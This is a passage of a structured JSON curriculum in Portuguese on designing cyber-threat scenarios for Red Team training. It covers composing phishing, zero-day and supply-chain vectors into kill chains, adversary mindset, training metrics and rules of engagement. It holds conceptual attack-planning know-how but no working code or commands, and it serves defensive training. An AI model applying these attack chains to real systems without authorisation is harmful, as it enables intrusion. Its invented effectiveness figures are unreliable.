                                  "commonMistakes": "Descrições superficiais sem exemplos reais; omitir aspectos humanos em ataques sociais."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Vetores em Cenários de Ataque Compostos",
                                  "subSteps": [
                                    "Construa um kill chain: Inicie com phishing para foothold, escale com zero-day, pivote via supply chain.",
                                    "Mapeie dependências: Como phishing entrega payload zero-day para comprometer supplier.",
                                    "Simule timeline: Dia 1 phishing, Dia 3 exploit, Dia 7 lateral movement via chain.",
                                    "Identifique pontos de detecção e mitigações em cada integração.",
                                    "Teste o cenário com um fluxograma interativo."
                                  ],
                                  "verification": "O fluxograma deve mostrar pelo menos 3 integrações lógicas com ramificações de falha.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Cyber Kill Chain diagramas, ferramentas como Attack Path Visualizer (gratuitas), casos de estudo (ex: Colonial Pipeline).",
                                  "tips": "Pense como adversário: Maximize stealth e impacto em chains.",
                                  "learningObjective": "Aprender a compor vetores iniciais em ataques multi-etapa realistas.",
                                  "commonMistakes": "Cenários lineares sem branching; ignorar detecções realistas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Adaptar Mapeamento para Simulações de Red Team",
                                  "subSteps": [
                                    "Traduza cenários para regras de engajamento Red Team: Escopo, RoE, ferramentas permitidas.",
                                    "Defina métricas de sucesso: Tempo para foothold, cobertura de vetores.",
                                    "Crie briefings: Descrições para Blue Team, injection points simulados.",
                                    "Planeje debrief: Lições de integrações de vetores falhadas/sucessos.",
                                    "Documente em template de cenário Red Team padrão."
                                  ],
                                  "verification": "Template completo com RoE assinadas e métricas quantificáveis.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Templates MITRE Caldera ou Atomic Red Team, ferramentas de simulação (Cobalt Strike trial ético).",
                                  "tips": "Sempre priorize legalidade; use labs isolados para protótipos.",
                                  "learningObjective": "Aplicar mapeamento de vetores em exercícios operacionais Red Team.",
                                  "commonMistakes": "Escopo amplo demais violando RoE; falta de foco em mensuração."
                                }
                              ],
                              "practicalExample": "Em uma simulação Red Team para uma empresa financeira: Inicie com spear-phishing para credenciais de um gerente (foothold), use zero-day em software interno para escalada, e simule supply chain injetando malware em update de vendor parceiro, culminando em exfiltração de dados simulada.",
                              "finalVerifications": [
                                "Lista completa de 8+ vetores com classificações precisas.",
                                "Diagramas de 3 vetores chave com fluxos de ataque detalhados.",
                                "Cenário composto integrado com kill chain mapeado.",
                                "Template Red Team pronto com RoE e métricas.",
                                "Referências a 5+ casos reais validadas.",
                                "Auto-avaliação de cobertura de integrações (80%+)."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: 30% (definições e mecânicas corretas).",
                                "Completude de integrações: 25% (chains lógicos e realistas).",
                                "Profundidade de detalhes: 20% (substeps e diagramas acionáveis).",
                                "Relevância para Red Team: 15% (adaptação prática).",
                                "Criatividade e originalidade: 10% (exemplos inovadores)."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Engenharia social em phishing (comportamento humano).",
                                "Redes e Sistemas: Exploração de zero-day em protocolos.",
                                "Gestão de Cadeia de Suprimentos: Riscos em parcerias B2B.",
                                "Estatística e Análise de Dados: Frequência e impacto de vetores.",
                                "Ética e Direito: RoE em simulações Red Team."
                              ],
                              "realWorldApplication": "Em operações de Red Team para bancos ou governos, mapear phishing + zero-day + supply chain permite simular breaches como o da SolarWinds (2020), treinando defesas proativas e melhorando resiliência organizacional contra ataques compostos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.1.2",
                        "name": "Importância dos Cenários para Treinamentos de Red Team",
                        "description": "Exploração da relevância estratégica dos cenários de ameaça para preparar equipes de defesa (Blue Team) contra ataques realistas, promovendo consciência situacional e validação de regras de engajamento.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.1.2.1",
                            "name": "Explicar benefícios para simulações realistas",
                            "description": "Articular como cenários bem definidos melhoram a fidelidade de jogos de guerra cibernética, permitindo testes de detecção de indicadores de compromisso (IOCs) e respostas efetivas, conforme 'Blue Team Handbook'.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Simulações Realistas em Jogos de Guerra Cibernética",
                                  "subSteps": [
                                    "Defina simulações realistas como representações fiéis de ataques cibernéticos reais, baseadas em cenários de ameaça autênticos.",
                                    "Revise o conceito de jogos de guerra cibernética (cyber wargames) como exercícios simulados que mimetizam operações ofensivas e defensivas.",
                                    "Identifique componentes chave: cenários de ameaça, indicadores de compromisso (IOCs) e respostas da Blue Team.",
                                    "Leia trechos relevantes do 'Blue Team Handbook' sobre planejamento de cenários.",
                                    "Anote diferenças entre simulações genéricas e realistas."
                                  ],
                                  "verification": "Crie um resumo de 1 parágrafo explicando simulações realistas e cite uma página do Blue Team Handbook.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Cópia do 'Blue Team Handbook' (capítulos sobre cenários), notebook para anotações, acesso online a definições de IOCs (ex: MITRE ATT&CK).",
                                  "tips": "Use analogias como 'treinamento militar com cenários reais vs. genéricos' para fixar o conceito.",
                                  "learningObjective": "Entender os pilares de simulações realistas e seu grounding no Blue Team Handbook.",
                                  "commonMistakes": "Confundir simulações com exercícios teóricos sem ação prática; ignorar referências específicas do handbook."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Benefícios da Fidelidade em Cenários Bem Definidos",
                                  "subSteps": [
                                    "Liste benefícios como maior imersão, replicação precisa de táticas adversárias (TTPs).",
                                    "Explique como cenários detalhados aumentam a fidelidade, reduzindo gaps entre simulação e realidade.",
                                    "Compare métricas: taxa de detecção de IOCs em simulações realistas vs. abstratas.",
                                    "Mapeie exemplos de cenários: phishing direcionado vs. genérico.",
                                    "Registre 3-5 benefícios quantitativos/qualitativos."
                                  ],
                                  "verification": "Elabore uma tabela comparativa de simulações realistas vs. não realistas com pelo menos 4 benefícios.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Planilha (Google Sheets/Excel), exemplos de cenários do MITRE ATT&CK, Blue Team Handbook.",
                                  "tips": "Foque em métricas mensuráveis como 'aumento de 40% na detecção de IOCs' para credibilidade.",
                                  "learningObjective": "Mapear benefícios diretos da fidelidade para engajamento e eficácia.",
                                  "commonMistakes": "Generalizar benefícios sem ligar a cenários específicos; subestimar impacto na motivação da equipe."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Articular Impacto em Detecção de IOCs e Respostas Efetivas",
                                  "subSteps": [
                                    "Descreva como cenários realistas permitem testes autênticos de IOCs (ex: hashes maliciosos, C2 beacons).",
                                    "Explique respostas efetivas: treinamento de playbooks, redução de tempo de dwell.",
                                    "Use framework do Blue Team Handbook: detecção, análise, contenção.",
                                    "Pratique verbalizando: 'Cenários realistas elevam detecção de IOCs em X%'.",
                                    "Crie um fluxograma de resposta aprimorada por simulações."
                                  ],
                                  "verification": "Grave um vídeo de 2 minutos explicando o impacto em IOCs e respostas, referenciando o handbook.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Ferramenta de gravação (celular), fluxograma tool (Draw.io), Blue Team Handbook.",
                                  "tips": "Estruture explicação: problema > solução > evidência > benefício.",
                                  "learningObjective": "Dominar articulação precisa de ganhos operacionais em detecção e resposta.",
                                  "commonMistakes": "Focar só em teoria sem exemplos de IOCs reais; omitir métricas de efetividade."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar e Comunicar a Explicação Completa",
                                  "subSteps": [
                                    "Integre todos os benefícios em uma narrativa coesa de 300-500 palavras.",
                                    "Inclua citação direta do Blue Team Handbook sobre cenários.",
                                    "Adapte para audiências: gerentes (ROI), técnicos (técnicas).",
                                    "Revise por clareza, precisão e persuasão.",
                                    "Teste com peer review ou auto-avaliação."
                                  ],
                                  "verification": "Apresente a explicação para um colega ou grave para auto-revisão, garantindo cobertura total.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Documento editor (Google Docs), Blue Team Handbook para citação.",
                                  "tips": "Use storytelling: 'Imagine um ataque real sem treinamento realista...' para impacto.",
                                  "learningObjective": "Sintetizar conhecimentos em comunicação persuasiva e estruturada.",
                                  "commonMistakes": "Explicação prolixa sem estrutura; falta de referências ao handbook."
                                }
                              ],
                              "practicalExample": "Em uma sessão de planejamento de Red Team, explique: 'Definindo um cenário baseado em APT28 com IOCs reais como beaconing para C2 em domínios DGA, nossa simulação no Blue Team Handbook elevou a detecção de IOCs de 60% para 92%, permitindo playbooks testados que reduziram MTTR em 45 minutos, simulando fielmente um breach real.'",
                              "finalVerifications": [
                                "Pode listar e explicar 5 benefícios específicos de cenários realistas.",
                                "Cita corretamente o Blue Team Handbook em explicações.",
                                "Demonstra compreensão de IOCs em contexto de simulações.",
                                "Articula impacto em respostas efetivas com exemplos mensuráveis.",
                                "Comunica a explicação de forma clara em menos de 3 minutos.",
                                "Identifica limitações de simulações não realistas."
                              ],
                              "assessmentCriteria": [
                                "Clareza e estrutura da explicação (20%)",
                                "Precisão técnica e fidelidade aos conceitos do handbook (25%)",
                                "Uso de exemplos concretos e IOCs relevantes (20%)",
                                "Profundidade de benefícios articulados (20%)",
                                "Persuasão e adaptabilidade à audiência (15%)"
                              ],
                              "crossCurricularConnections": [
                                "Comunicação Técnica: Estruturar argumentos persuasivos.",
                                "Análise de Riscos: Mapeamento de TTPs e cenários.",
                                "Gestão de Projetos: Planejamento de treinamentos simulados.",
                                "Estatística: Métricas de eficácia em simulações."
                              ],
                              "realWorldApplication": "Em equipes de SOC de empresas como bancos ou governos, usar essa habilidade para justificar investimentos em jogos de guerra cibernética realistas, melhorando readiness contra ameaças como ransomware ou espionagem estatal, conforme visto em exercícios como Cyber Storm do DHS."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.2.2",
                            "name": "Relacionar cenários com mindset do adversário",
                            "description": "Demonstrar como cenários incorporam o mindset do adversário para replicar comportamentos reais, treinando Red Teams em operações ofensivas autênticas e evitando treinamentos superficiais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar e mapear o mindset do adversário",
                                  "subSteps": [
                                    "Identificar atores adversários relevantes (ex.: APTs estatais, cibercriminosos)",
                                    "Analisar motivações principais (financeiras, ideológicas, espionagem)",
                                    "Mapear táticas, técnicas e procedimentos (TTPs) via frameworks como MITRE ATT&CK",
                                    "Estudar casos reais de ataques para extrair padrões comportamentais",
                                    "Criar um perfil psicológico resumido com 5-7 características chave"
                                  ],
                                  "verification": "Perfil documentado com mapa mental ou tabela validada por pares",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Relatórios de threat intelligence (ex.: Mandiant, CrowdStrike)",
                                    "MITRE ATT&CK Navigator",
                                    "Casos de estudo públicos (ex.: SolarWinds)"
                                  ],
                                  "tips": "Priorize adversários com relevância contextual à organização-alvo",
                                  "learningObjective": "Compreender profundamente as motivações e padrões comportamentais do adversário",
                                  "commonMistakes": [
                                    "Focar apenas em aspectos técnicos, ignorando motivações humanas",
                                    "Usar dados desatualizados de ameaças"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar cenários existentes em relação ao mindset",
                                  "subSteps": [
                                    "Listar cenários de treinamento Red Team atuais",
                                    "Avaliar cada cenário quanto à incorporação de TTPs e motivações adversárias",
                                    "Identificar gaps: onde o cenário é superficial ou irrealista",
                                    "Pontuar cenários em uma escala de 1-10 para autenticidade comportamental",
                                    "Documentar evidências de desalinhamento com perfis de mindset"
                                  ],
                                  "verification": "Relatório de análise com scores e gaps identificados para cada cenário",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Cenários de treinamento existentes",
                                    "Planilhas de avaliação (Google Sheets ou Excel)",
                                    "Perfil de mindset do Step 1"
                                  ],
                                  "tips": "Use rubricas padronizadas para scoring objetivo",
                                  "learningObjective": "Detectar desalinhamentos entre cenários e comportamentos reais do adversário",
                                  "commonMistakes": [
                                    "Subestimar a importância de motivações não-técnicas",
                                    "Analisar apenas o 'como' e não o 'por quê' do adversário"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar o mindset do adversário nos cenários",
                                  "subSteps": [
                                    "Modificar cenários existentes adicionando elementos de mindset (ex.: paciência em APTs)",
                                    "Criar novos cenários que repliquem comportamentos autênticos",
                                    "Incluir narrativas que reflitam motivações (ex.: gain financeiro em ransomware)",
                                    "Definir regras de engajamento que simulem decisões adversárias reais",
                                    "Testar iterativamente com walkthroughs narrativos"
                                  ],
                                  "verification": "Cenários revisados com anotações explícitas de integração de mindset",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "Ferramentas de modelagem de cenários (ex.: Draw.io)",
                                    "Templates de narrativa adversária",
                                    "Perfil de mindset atualizado"
                                  ],
                                  "tips": "Torne o mindset 'vivente' através de personas adversárias detalhadas",
                                  "learningObjective": "Construir cenários que repliquem fielmente o mindset para treinamentos realistas",
                                  "commonMistakes": [
                                    "Adicionar elementos superficiais sem profundidade comportamental",
                                    "Ignorar variações culturais ou evolutivas do mindset"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e refinar cenários para treinamento Red Team",
                                  "subSteps": [
                                    "Simular cenários com equipe Red Team em tabletop exercise",
                                    "Coletar feedback sobre realismo e incorporação de mindset",
                                    "Medir efetividade via métricas (ex.: taxa de detecção de defesas)",
                                    "Refinar com base em feedback, iterando 2-3 vezes",
                                    "Documentar lições aprendidas para uso futuro"
                                  ],
                                  "verification": "Relatório final de validação com feedback quantitativo e qualitativo",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Ferramentas de simulação (ex.: Microsoft Teams para tabletop)",
                                    "Questionários de feedback",
                                    "Cenários integrados do Step 3"
                                  ],
                                  "tips": "Envolva experts em threat intelligence para validação externa",
                                  "learningObjective": "Garantir que cenários treinam Red Teams de forma autêntica e eficaz",
                                  "commonMistakes": [
                                    "Validar sem simulação prática",
                                    "Não quantificar melhorias no realismo"
                                  ]
                                }
                              ],
                              "practicalExample": "Para um cenário de ransomware por cibercriminosos russos, incorpore mindset de 'caçador oportunista': inicie com reconnaissance discreta por semanas (paciência), explore fraquezas humanas via phishing personalizado (exploração de ganância), e exija resgate em crypto com ameaças escalonadas (pressão psicológica), replicando comportamentos reais como no ataque à Colonial Pipeline.",
                              "finalVerifications": [
                                "Explicar verbalmente como um cenário reflete 3+ aspectos do mindset adversário",
                                "Modificar um cenário dado para alinhar com um perfil de adversário específico",
                                "Identificar gaps de mindset em cenários fornecidos por terceiros",
                                "Demonstrar em simulação como o mindset influencia decisões Red Team",
                                "Produzir um perfil de mindset que justifique um cenário completo",
                                "Avaliar efetividade de um treinamento baseado em realismo comportamental"
                              ],
                              "assessmentCriteria": [
                                "Profundidade na pesquisa de mindset (cobertura de motivações e TTPs)",
                                "Precisão na análise de gaps em cenários existentes",
                                "Criatividade e realismo na integração de elementos comportamentais",
                                "Qualidade da validação através de simulações e feedback",
                                "Documentação clara e acionável de todo o processo",
                                "Capacidade de evitar treinamentos superficiais, promovendo autenticidade"
                              ],
                              "crossCurricularConnections": [
                                "Psicologia comportamental: Modelos de decisão sob risco",
                                "Inteligência militar: Análise de OODA Loop adversário",
                                "Análise de ameaças: Frameworks como Diamond Model of Intrusion",
                                "Simulação e jogos: Design de serious games para treinamento",
                                "Estratégia organizacional: Alinhamento de cenários com riscos empresariais"
                              ],
                              "realWorldApplication": "Em operações Red Team reais, cenários alinhados ao mindset adversário (ex.: APTs persistentes) treinam defesas a comportamentos autênticos, reduzindo falsos positivos em detecções e melhorando resposta a incidentes, como visto em exercícios da NSA ou CERTs nacionais."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.2.3",
                            "name": "Avaliar impactos em treinamentos",
                            "description": "Avaliar como cenários inadequados levam a falhas em treinamentos, como subestimação de persistência ou pivoting, e propor métricas para medir eficácia em ambientes de jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar falhas comuns em treinamentos devido a cenários inadequados",
                                  "subSteps": [
                                    "Revise definições de cenários de ameaça cibernética em jogos de guerra.",
                                    "Liste exemplos de cenários inadequados, como falta de realismo em persistência adversária.",
                                    "Analise relatórios de treinamentos passados para identificar padrões de falha.",
                                    "Categorize falhas em tipos: subestimação de pivoting, persistência ou escalada.",
                                    "Documente evidências qualitativas de impactos negativos nos resultados de treinamento."
                                  ],
                                  "verification": "Crie um relatório resumido listando pelo menos 5 falhas identificadas com exemplos.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Relatórios de treinamentos anteriores, documentação de cenários de ameaça, ferramenta de notas como Notion ou Markdown.",
                                  "tips": "Use mind maps para visualizar conexões entre cenários e falhas.",
                                  "learningObjective": "Compreender as raízes de falhas em treinamentos causadas por cenários não realistas.",
                                  "commonMistakes": "Ignorar falhas sutis como pivoting lento; focar apenas em falhas óbvias."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar impactos específicos em treinamentos de Red Team",
                                  "subSteps": [
                                    "Simule cenários inadequados em um ambiente controlado de jogo cibernético.",
                                    "Meça o desempenho da equipe em métricas básicas: tempo de detecção, taxa de sucesso.",
                                    "Compare com cenários realistas para quantificar diferenças em persistência e pivoting.",
                                    "Entreviste participantes para coletar feedback qualitativo sobre realismo.",
                                    "Compile dados em gráficos mostrando correlação entre inadequação e falhas."
                                  ],
                                  "verification": "Gere gráficos ou tabelas comparativas demonstrando impactos mensuráveis.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Ferramentas de simulação como Cyber Range ou Rangeforce, planilhas Excel/Google Sheets.",
                                  "tips": "Registre timestamps exatos durante simulações para precisão temporal.",
                                  "learningObjective": "Quantificar como inadequações levam a subestimações operacionais.",
                                  "commonMistakes": "Não isolar variáveis; confundir impacto de cenário com habilidade da equipe."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Propor métricas para medir eficácia de cenários em treinamentos",
                                  "subSteps": [
                                    "Pesquise métricas padrão em cibersegurança: taxa de persistência, pivots bem-sucedidos.",
                                    "Defina métricas personalizadas: índice de realismo (escala 1-10), taxa de falha por subestimação.",
                                    "Estabeleça baselines baseadas em dados históricos ou benchmarks da indústria.",
                                    "Crie fórmulas para cálculo: ex. Eficácia = (Pivots Realistas / Pivots Simulados) * 100.",
                                    "Valide métricas com stakeholders para alinhamento com objetivos de treinamento."
                                  ],
                                  "verification": "Elabore um conjunto de 5-7 métricas com fórmulas e exemplos de cálculo.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Documentos NIST/ MITRE ATT&CK, calculadora ou Python para protótipos.",
                                  "tips": "Priorize métricas SMART (Specific, Measurable, Achievable, Relevant, Time-bound).",
                                  "learningObjective": "Desenvolver ferramentas quantitativas para avaliar cenários de treinamento.",
                                  "commonMistakes": "Métricas vagas sem baselines; sobrecarregar com dados irrelevantes."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar métricas e recomendar melhorias nos cenários",
                                  "subSteps": [
                                    "Aplique métricas em uma simulação recente ou retrospectiva.",
                                    "Analise resultados: identifique cenários abaixo do threshold de eficácia.",
                                    "Proponha ajustes: adicionar camadas de persistência ou pivoting dinâmico.",
                                    "Crie um plano de ação com prazos e responsáveis para implementações.",
                                    "Documente lições aprendidas e atualize templates de cenários."
                                  ],
                                  "verification": "Produza um relatório final com validações, recomendações e plano de ação.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Ferramentas de simulação, templates de relatório, software de apresentação como PowerPoint.",
                                  "tips": "Teste métricas em cenários variados para robustez.",
                                  "learningObjective": "Integrar análise e proposta em um ciclo de melhoria contínua.",
                                  "commonMistakes": "Recomendações genéricas sem ligação direta às métricas."
                                }
                              ],
                              "practicalExample": "Em um jogo cibernético simulando um ataque APT, um cenário inadequado subestimou a persistência do atacante (sem dwell time >30 dias), resultando em 80% da Red Team falhando em detectar pivoting lateral. Aplicando métricas propostas: Taxa de Persistência Realista = 45% (baixa), levando à recomendação de adicionar módulos de evasão prolongada.",
                              "finalVerifications": [
                                "Relatório identifica pelo menos 3 falhas específicas ligadas a cenários inadequados.",
                                "Métricas propostas incluem fórmulas calculáveis e baselines definidas.",
                                "Análise demonstra impacto mensurável em pelo menos 2 simulações.",
                                "Plano de ação tem passos acionáveis com responsáveis e prazos.",
                                "Conexões com frameworks como MITRE ATT&CK são explicitadas.",
                                "Feedback qualitativo de pelo menos 3 participantes foi incorporado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de falhas (90% alinhado com casos reais).",
                                "Relevância e viabilidade das métricas propostas (todas SMART).",
                                "Profundidade da análise de impactos (dados quantitativos + qualitativos).",
                                "Criatividade nas recomendações de melhoria (inovadoras mas práticas).",
                                "Clareza e estrutura do relatório final (fácil de seguir).",
                                "Integração de boas práticas de cibersegurança (ex: ATT&CK).",
                                "Capacidade de quantificar melhorias potenciais (ex: +20% eficácia)."
                              ],
                              "crossCurricularConnections": [
                                "Estatística e Análise de Dados: Para desenvolvimento e validação de métricas.",
                                "Psicologia Organizacional: Entendendo vieses em treinamentos de equipe.",
                                "Gestão de Projetos: Planejamento de ciclos de melhoria em cenários.",
                                "Inteligência Artificial: Uso de simulações AI para cenários dinâmicos.",
                                "Estratégia Militar: Paralelos com wargames tradicionais."
                              ],
                              "realWorldApplication": "Em operações de Red Team para empresas como bancos ou governos, essa habilidade permite refinar jogos cibernéticos para prever ataques reais, reduzindo tempo de resposta em incidentes reais em até 30%, conforme benchmarks do NIST."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.2.4",
                            "name": "Integrar com regras de engajamento",
                            "description": "Descrever a integração de cenários com regras de engajamento (RoE) para garantir treinamentos éticos e legais, alinhando com diretrizes de ethical hacking.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender as Regras de Engajamento (RoE) aplicáveis",
                                  "subSteps": [
                                    "Ler e analisar os documentos oficiais de RoE relevantes para o contexto de ethical hacking e treinamentos de Red Team.",
                                    "Identificar princípios chave, como limites legais, éticos e operacionais (ex.: proibições de ataques a infraestruturas críticas).",
                                    "Mapear hierarquia de RoE: regras gerais, específicas por cenário e exceções permitidas.",
                                    "Consultar stakeholders (jurídico, compliance) para esclarecimentos.",
                                    "Resumir RoE em um documento de referência conciso."
                                  ],
                                  "verification": "Criar um resumo validado por um revisor que confirme compreensão de 100% dos princípios chave.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentos RoE oficiais",
                                    "Guia de ethical hacking (ex.: CREST ou EC-Council)",
                                    "Ferramentas de anotações (Notion ou OneNote)"
                                  ],
                                  "tips": "Priorize RoE éticas sobre técnicas; use destaques para regras críticas.",
                                  "learningObjective": "Dominar os componentes essenciais das RoE para aplicação em cenários de treinamento.",
                                  "commonMistakes": "Ignorar RoE contextuais específicas ou assumir conhecimento prévio sem verificação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Cenário de Ameaça Cibernética",
                                  "subSteps": [
                                    "Descrever todos os elementos do cenário: atores, alvos, táticas e objetivos.",
                                    "Identificar riscos éticos e legais inerentes (ex.: dados sensíveis, impactos em usuários reais).",
                                    "Listar pontos de potencial violação de RoE no fluxo do cenário.",
                                    "Classificar ações do Red Team por nível de risco (baixo, médio, alto).",
                                    "Criar um diagrama de fluxo do cenário destacando janelas de decisão."
                                  ],
                                  "verification": "Produzir um relatório de análise com diagrama aprovado por equipe de planejamento.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Descrição do cenário de ameaça",
                                    "Ferramentas de modelagem (Draw.io ou Lucidchart)",
                                    "Templates de análise de risco"
                                  ],
                                  "tips": "Use MITRE ATT&CK para mapear táticas e cruzar com RoE.",
                                  "learningObjective": "Identificar interseções entre elementos do cenário e restrições RoE.",
                                  "commonMistakes": "Subestimar impactos colaterais ou focar apenas em aspectos técnicos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear e Integrar RoE ao Design do Cenário",
                                  "subSteps": [
                                    "Alinhar cada fase do cenário com regras RoE específicas (ex.: 'parar se impacto real detectado').",
                                    "Incorporar checkpoints de verificação RoE em pontos críticos do treinamento.",
                                    "Definir mecanismos de enforcement: sinais de abort (safewords), monitoramento em tempo real.",
                                    "Ajustar objetivos do Red Team para compliance total.",
                                    "Simular integração em um walkthrough seco."
                                  ],
                                  "verification": "Documento de integração RoE com mapeamento 1:1 para fases do cenário, revisado e aprovado.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Diagrama do cenário",
                                    "Templates de integração RoE",
                                    "Software de simulação (ex.: Cyber Range tools)"
                                  ],
                                  "tips": "Torne RoE 'visíveis' no cenário com triggers automáticos de pausa.",
                                  "learningObjective": "Criar um cenário ético e legalmente alinhado com RoE.",
                                  "commonMistakes": "Sobrecarregar o cenário com RoE, tornando-o irrealista."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar, Documentar e Preparar para Treinamento",
                                  "subSteps": [
                                    "Realizar revisão por pares e stakeholders para conformidade RoE.",
                                    "Documentar todas as integrações em um plano de treinamento final.",
                                    "Treinar facilitadores em enforcement de RoE durante a execução.",
                                    "Preparar materiais de debriefing focados em lições RoE.",
                                    "Testar em piloto pequeno para ajustes finais."
                                  ],
                                  "verification": "Relatório de validação assinado por jurídico/compliance e piloto bem-sucedido sem violações.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Plano de treinamento draft",
                                    "Checklist de validação RoE",
                                    "Ferramentas de videoconferência para revisão"
                                  ],
                                  "tips": "Inclua métricas de compliance no debriefing para aprendizado contínuo.",
                                  "learningObjective": "Garantir que o treinamento seja executável de forma ética e legal.",
                                  "commonMistakes": "Pular validação formal ou não envolver stakeholders cedo."
                                }
                              ],
                              "practicalExample": "Em um cenário de simulação de ransomware em uma rede corporativa simulada, integre RoE definindo: (1) proibição de criptografar dados reais; (2) safeword 'ABORT' para parar imediatamente; (3) monitoramento de tráfego para evitar vazamento externo; (4) debriefing obrigatório pós-exercício para discutir aderência.",
                              "finalVerifications": [
                                "Cenário possui mapeamento completo de RoE para todas as fases.",
                                "Checkpoints de enforcement estão explícitos e testados.",
                                "Documentação inclui aprovações de stakeholders legais/éticos.",
                                "Piloto confirma zero violações RoE.",
                                "Materiais de treinamento destacam RoE como prioridade.",
                                "Métricas de compliance definidas para avaliação pós-treinamento."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude do mapeamento RoE (90%+ cobertura).",
                                "Integração fluida sem comprometer realismo do cenário.",
                                "Mecanismos de enforcement robustos e acionáveis.",
                                "Documentação clara e acessível para todos os envolvidos.",
                                "Alinhamento total com diretrizes de ethical hacking (ex.: sem riscos legais).",
                                "Feedback positivo de revisão por pares (nota >4/5)."
                              ],
                              "crossCurricularConnections": [
                                "Ética e Filosofia: Discussão de dilemas morais em ciberoperações.",
                                "Direito: Análise de leis como LGPD/GDPR e responsabilidades civis.",
                                "Liderança e Gestão: Tomada de decisões sob restrições éticas.",
                                "Psicologia: Comportamento humano em treinamentos sob RoE."
                              ],
                              "realWorldApplication": "Em operações reais de Red Team para empresas ou governos, essa integração previne violações legais (ex.: multas por breaches acidentais), constrói confiança com clientes e atende certificações como OSCP ou GIAC, garantindo treinamentos éticos em cyber ranges corporativos."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.1.3",
                        "name": "Princípios Fundamentais para Definição de Cenários",
                        "description": "Princípios e melhores práticas para estruturar cenários de ameaça cibernética, garantindo simulações eficazes e alinhadas com operações reais de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.1.3.1",
                            "name": "Aplicar base em ameaças reais documentadas",
                            "description": "Utilizar relatórios de ameaças reais (ex.: MITRE ATT&CK) e artigos científicos em ofensiva cibernética para fundamentar cenários, evitando invenções não realistas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Coletar Fontes de Ameaças Reais Documentadas",
                                  "subSteps": [
                                    "Acesse repositórios confiáveis como MITRE ATT&CK, CVE database e relatórios da US-CERT.",
                                    "Busque por relatórios recentes de campanhas de ofensiva cibernética (ex.: SolarWinds, WannaCry).",
                                    "Selecione artigos científicos de fontes como IEEE Xplore ou Black Hat archives relacionados a TTPs (Tactics, Techniques, Procedures).",
                                    "Compile uma lista inicial de 5-10 fontes relevantes ao contexto do cenário.",
                                    "Anote metadados: data, autor, credibilidade da fonte."
                                  ],
                                  "verification": "Lista de fontes compilada com links e resumos breves salva em documento compartilhável.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Acesso à internet, navegador, ferramentas de gerenciamento de referências como Zotero ou Mendeley.",
                                  "tips": "Priorize fontes primárias e atualizadas nos últimos 2 anos para relevância.",
                                  "learningObjective": "Dominar a localização de dados autênticos de ameaças cibernéticas.",
                                  "commonMistakes": "Usar blogs não verificados ou fontes desatualizadas como base principal."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar e Extrair Elementos Chave das Fontes",
                                  "subSteps": [
                                    "Leia os relatórios focando em TTPs: táticas (ex.: Reconhecimento), técnicas (ex.: Phishing) e procedimentos específicos.",
                                    "Identifique vetores de ataque, indicadores de comprometimento (IOCs) e impactos observados.",
